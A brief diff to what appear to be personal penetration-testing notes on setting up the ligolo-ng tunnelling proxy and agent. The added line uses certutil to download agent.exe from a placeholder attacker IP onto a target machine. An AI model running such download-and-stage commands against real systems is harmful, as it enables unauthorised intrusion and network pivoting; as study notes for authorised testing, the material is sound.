@@ -1,6 +1,8 @@
 https://www.youtube.com/watch?v=DM1B8S80EvQ
 Download agent and proxy for ligolo-nc for proxy and agent.
 
+certutil -urlcache -split -f http://<attacker-ip>/agent.exe ag.exe
+
 LOCAL
 
 ./proxy -selfcert
